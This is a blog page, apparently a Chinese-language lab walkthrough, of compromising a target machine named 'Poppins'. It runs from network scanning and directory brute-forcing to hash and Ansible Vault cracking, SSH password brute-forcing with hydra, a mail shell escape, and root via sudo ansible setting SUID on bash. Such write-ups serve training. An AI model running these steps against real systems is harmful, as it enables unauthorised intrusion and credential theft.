@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 一、信息收集 
+
+使用 arp-scan 扫描局域网中的主机：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+...
+192.168.205.143 08:00:27:77:42:bb       PCS Systemtechnik GmbH
+...
+```
+
+发现目标主机：`192.168.205.143`
+
+## 端口扫描
+
+对目标主机进行全端口扫描：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.143
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 15:20 EDT
+Nmap scan report for 192.168.205.143
+Host is up (0.000089s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+110/tcp open  pop3
+995/tcp open  pop3s
+```
+
+发现四个开放端口：
+
+- **22/tcp**: SSH服务
+- **80/tcp**: HTTP服务
+- **110/tcp**: POP3服务
+- **995/tcp**: POP3S服务
+
+# 二、Web服务探测
+
+访问80端口发现是一个电影介绍页面，包含一些人名信息。">
+<meta property="og:title" content="内部_Poppins">
+<meta property="og:description" content="# 一、信息收集 
+
+使用 arp-scan 扫描局域网中的主机：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+...
+192.168.205.143 08:00:27:77:42:bb       PCS Systemtechnik GmbH
+...
+```
+
+发现目标主机：`192.168.205.143`
+
+## 端口扫描
+
+对目标主机进行全端口扫描：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.143
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 15:20 EDT
+Nmap scan report for 192.168.205.143
+Host is up (0.000089s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+110/tcp open  pop3
+995/tcp open  pop3s
+```
+
+发现四个开放端口：
+
+- **22/tcp**: SSH服务
+- **80/tcp**: HTTP服务
+- **110/tcp**: POP3服务
+- **995/tcp**: POP3S服务
+
+# 二、Web服务探测
+
+访问80端口发现是一个电影介绍页面，包含一些人名信息。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Poppins.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_Poppins</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Poppins</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/241" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
+<p>使用 arp-scan 扫描局域网中的主机：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+...
+192.168.205.143 08:00:27:77:42:bb       PCS Systemtechnik GmbH
+...</pre></div>
+<p>发现目标主机：<code class="notranslate">192.168.205.143</code></p>
+<h2>端口扫描</h2>
+<p>对目标主机进行全端口扫描：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.143
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 15:20 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.205.143
+Host is up (0.000089s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+110/tcp open  pop3
+995/tcp open  pop3s</pre></div>
+<p>发现四个开放端口：</p>
+<ul>
+<li><strong>22/tcp</strong>: SSH服务</li>
+<li><strong>80/tcp</strong>: HTTP服务</li>
+<li><strong>110/tcp</strong>: POP3服务</li>
+<li><strong>995/tcp</strong>: POP3S服务</li>
+</ul>
+<h1>二、Web服务探测</h1>
+<p>访问80端口发现是一个电影介绍页面，包含一些人名信息。</p>
+<h2>目录枚举</h2>
+<p>使用 dirsearch 进行目录扫描：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -u 192.168.205.143        
+...
+[15:23:04] 301 -  314B  - /s  -<span class="pl-k">&gt;</span>  http://192.168.205.143/s/
+...</pre></div>
+<p>发现 <code class="notranslate">/s</code> 目录，继续深入探测。</p>
+<h2>深度目录爆破的思路</h2>
+<p>这里有个关键的思路转换：当发现只有一个 <code class="notranslate">/s</code> 目录时，我想到这可能不是普通的目录结构。结合这是Sublarge出的靶机，我记得之前做过类似的题目，有些靶机会把SSH私钥或重要文件藏在很深的目录路径中。</p>
+<p>既然只发现了字母 <code class="notranslate">s</code>，那很可能是按字母逐层构建的深层目录。于是我决定用单字母作为字典进行递归爆破：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ <span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">'</span>%s\n<span class="pl-pds">'</span></span> {a..z} <span class="pl-k">&gt;</span> a.txt                                       
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ <span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">'</span>%s\n<span class="pl-pds">'</span></span> {A..Z} <span class="pl-k">&gt;&gt;</span> a.txt</pre></div>
+<p>创建包含所有大小写字母的字典文件，然后使用 feroxbuster 进行深度递归扫描：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ feroxbuster --url http://192.168.205.143 -w a.txt -t 64 --depth 99999
+...
+301      GET        9l       28w      314c http://192.168.205.143/s =<span class="pl-k">&gt;</span> http://192.168.205.143/s/
+301      GET        9l       28w      316c http://192.168.205.143/s/u =<span class="pl-k">&gt;</span> http://192.168.205.143/s/u/
+301      GET        9l       28w      318c http://192.168.205.143/s/u/p =<span class="pl-k">&gt;</span> http://192.168.205.143/s/u/p/
+...
+301      GET        9l       28w      380c http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ =<span class="pl-k">&gt;</span> 
+...</pre></div>
+<p><strong>关键洞察</strong>：这里设置 <code class="notranslate">--depth 99999</code> 是为了让工具无限递归，直到找不到更多目录为止。随着扫描的进行，可以看到路径越来越长，最终揭示了完整的单词：</p>
+<p><code class="notranslate">s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s</code></p>
+<p>这个路径实际上是单词 <strong>"supercalifragilisticexpialidocious"</strong> 的字母分解，这是电影《欢乐满人间》(Mary Poppins)中的经典单词，与靶机名称"Poppins"呼应。</p>
+<p>在该超长目录下继续扫描：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ gobuster dir -u http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64 
+...
+/index.html           (Status: 200) [Size: 1531]
+/hash.bak             (Status: 200) [Size: 3300]</pre></div>
+<p>果然发现了关键文件 <code class="notranslate">hash.bak</code>。</p>
+<h1>三、哈希破解</h1>
+<p>下载并分析 hash.bak 文件：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/hash.bak
+fcb6cc0d2a780ac022cf70ceb0d85f4c
+c63c3575b62f4944fba4879c2dd3951b
+...</pre></div>
+<p>文件包含100个MD5哈希值。使用john进行破解：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span> --format=Raw-MD5     
+...
+kent12           (<span class="pl-k">?</span>)   
+amotejoel        (<span class="pl-k">?</span>)   
+sunjoo           (<span class="pl-k">?</span>)   
+...</pre></div>
+<p>提取破解成功的密码：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ john --show <span class="pl-c1">hash</span> --format=Raw-MD5 <span class="pl-k">|</span> cut -d: -f2 <span class="pl-k">|</span> sort <span class="pl-k">|</span> uniq <span class="pl-k">&gt;</span> pass</pre></div>
+<h1>四、用户名收集与SSH爆破</h1>
+<h2>用户名枚举</h2>
+<p>使用 cewl 从主页提取可能的用户名：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ cewl http://192.168.205.143/ <span class="pl-k">|</span> tr <span class="pl-s"><span class="pl-pds">'</span>A-Z<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>a-z<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> user</pre></div>
+<p>通过SSH连接测试，发现系统的行为特点：</p>
+<ul>
+<li>存在的用户会提示输入密码</li>
+<li>不存在的用户直接返回 "Permission denied (publickey)"</li>
+</ul>
+<p>利用此特点枚举有效用户：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ <span class="pl-k">while</span> <span class="pl-c1">read</span> u<span class="pl-k">;</span> <span class="pl-k">do</span> timeout 3 ssh <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$u</span>@192.168.205.143<span class="pl-pds">"</span></span> <span class="pl-k">2&gt;&amp;1</span> <span class="pl-k">|</span> grep -q <span class="pl-s"><span class="pl-pds">"</span>publickey<span class="pl-pds">"</span></span> <span class="pl-k">||</span> <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$u</span><span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-k">done</span> <span class="pl-k">&lt;</span> user
+jane
+bert</pre></div>
+<p>发现三个有效用户：jane、bert、root</p>
+<h2>SSH密码爆破</h2>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ <span class="pl-c1">echo</span> -e <span class="pl-s"><span class="pl-pds">"</span>jane\nbert\nroot<span class="pl-pds">"</span></span> <span class="pl-k">&gt;</span> user                                                       
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ hydra -L user -P pass ssh://192.168.205.143 -I -u -e nsr -t 64
+...
+[22][ssh] host: 192.168.205.143   login: bert   password: jmac92777</pre></div>
+<p>成功获得bert用户的凭据：<code class="notranslate">bert:jmac92777</code></p>
+<h1>五、初始访问与邮件分析</h1>
+<p>尝试SSH登录bert用户：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ssh bert@192.168.205.143          
+bert@192.168.205.143<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s">...</span>
+<span class="pl-s">You have mail.</span>
+<span class="pl-s">This account is currently not available.</span>
+<span class="pl-s">Connection to 192.168.205.143 closed.</span></pre></div>
+<p>虽然SSH会话被立即关闭，但提示显示有邮件。使用POP3协议查看邮件：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ nc 192.168.205.143 110
++OK Dovecot (Debian) ready.
+User bert
++OK
+Pass jmac92777
++OK Logged in.
+STAT
++OK 1 1517
+retr 1
++OK 1517 octets</pre></div>
+<p>邮件内容显示Jane发送给Bert的重要信息：</p>
+<pre class="notranslate"><code class="notranslate">Subject: Urgent: Prod Server Credentials for Ansible Playbook
+From: jane@poppins
+To: bert@poppins
+
+Hi Bert,
+
+I've just finished the new Ansible playbook for the a-27 software deployment on our main production server, `web01.poppins.dsz`. It's ready to go.
+
+The playbook contains some sensitive API keys, so I've encrypted the variables using Ansible Vault. You'll need to use the `ansible-vault decrypt` command to run it.
+
+Here is the vault string you'll need to paste into the `secrets.yml` file.
+
+$ANSIBLE_VAULT;1.1;AES256
+66626631636362303332633238373338386634373434646532656534323230333938303331663630
+3236333934663930343263363831353138323630393134320a366366393939373636386538336336
+34353536656637313762323832643339633234656635326137633439303730373335386536306436
+6335363366376634630a326563623737626337353436323565643365333061663661396337613731
+3730
+</code></pre>
+<h1>六、Ansible Vault破解</h1>
+<h2>提取并破解Vault密码</h2>
+<p>将Vault内容保存到文件并使用john破解：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ansible2john secrets.yml <span class="pl-k">&gt;</span> <span class="pl-c1">hash</span>                                                
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span>                             
+...
+javiel           (secrets.yml)   </pre></div>
+<p>使用破解的密码解密Vault：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ansible-vault view secrets.yml                                                 
+Vault password: javiel
+cumibug</pre></div>
+<p>获得两个关键信息：</p>
+<ul>
+<li>Vault密码：<code class="notranslate">javiel</code></li>
+<li>解密后的密码：<code class="notranslate">cumibug</code></li>
+</ul>
+<h1>七、权限提升</h1>
+<h2>获得Jane用户权限</h2>
+<p>尝试使用解密的Vault密码作为Jane的密码：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ssh jane@192.168.205.143
+jane@192.168.205.143<span class="pl-s"><span class="pl-pds">'</span>s password: javiel</span>
+<span class="pl-s">...</span>
+<span class="pl-s">jane@Poppins:~$ id</span>
+<span class="pl-s">uid=1001(jane) gid=1001(jane) groups=1001(jane)</span></pre></div>
+<h2>切换到Michael用户</h2>
+<p>使用Vault中的密码切换到michael用户：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">jane@Poppins:/home$ su michael
+Password: cumibug
+michael@Poppins:/home$ sudo -l
+...
+User michael may run the following commands on Poppins:
+    (winifred) PASSWD: /usr/bin/mail <span class="pl-k">*</span></pre></div>
+<p>Michael可以以winifred用户身份运行mail命令。</p>
+<h2>利用mail命令提升到Winifred</h2>
+<p>参考GTFObins，mail命令可以通过交互式shell逃逸，但是因为它这个mail命令版本太低（应该是吧）的原因，无法直接使用<code class="notranslate">--exec</code>参数，我们只可以给自己发送一个邮件，进到mail交互通过交互式shell逃逸：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">michael@Poppins:/home$ sudo -u winifred /usr/bin/mail -s <span class="pl-s"><span class="pl-pds">"</span>test<span class="pl-pds">"</span></span> winifred <span class="pl-k">&lt;</span> /dev/null
+Null message body<span class="pl-k">;</span> hope that<span class="pl-s"><span class="pl-pds">'</span>s ok</span>
+<span class="pl-s">michael@Poppins:/home$ sudo -u winifred /usr/bin/mail</span>
+<span class="pl-s">Mail version 8.1.2 01/15/2001.  Type ? for help.</span>
+<span class="pl-s">"/var/mail/winifred": 1 message 1 new</span>
+<span class="pl-s">&gt;N  1 winifred@poppins   Tue Sep 02 09:41   18/558   test</span>
+<span class="pl-s">&amp; !/bin/bash</span></pre></div>
+<p>成功获得winifred用户权限：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">winifred@Poppins:/home$ sudo -l
+...
+User winifred may run the following commands on Poppins:
+    (ALL) NOPASSWD: /usr/bin/ansible <span class="pl-k">*</span></pre></div>
+<h2>利用Ansible获得Root权限</h2>
+<p>Winifred可以无密码运行ansible命令。Ansible的shell模块可以执行任意命令：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">winifred@Poppins:/home$ sudo /usr/bin/ansible localhost -m shell -a <span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span> 
+[WARNING]: No inventory was parsed, only implicit localhost is available
+localhost <span class="pl-k">|</span> CHANGED <span class="pl-k">|</span> rc=0 <span class="pl-k">&gt;&gt;</span>
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+<p>为bash设置SUID位以获得持久的root权限：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">winifred@Poppins:/home$ sudo /usr/bin/ansible localhost -m shell -a <span class="pl-s"><span class="pl-pds">"</span>chmod +s /bin/bash<span class="pl-pds">"</span></span> 
+...
+winifred@Poppins:/home$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+winifred@Poppins:/home$ bash -p
+bash-5.0# id
+uid=1003(winifred) gid=1003(winifred) euid=0(root) egid=0(root) groups=0(root),1003(winifred)</pre></div>
+<h1>八、获取flag</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">bash-5.0# cat /root/root.txt /var/mail/user.txt 
+flag{root-bdabe071bed8018ba8e15d795d281843}
+flag{user-b1d2367529a9edd2a6f9c95168bce12ei}</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
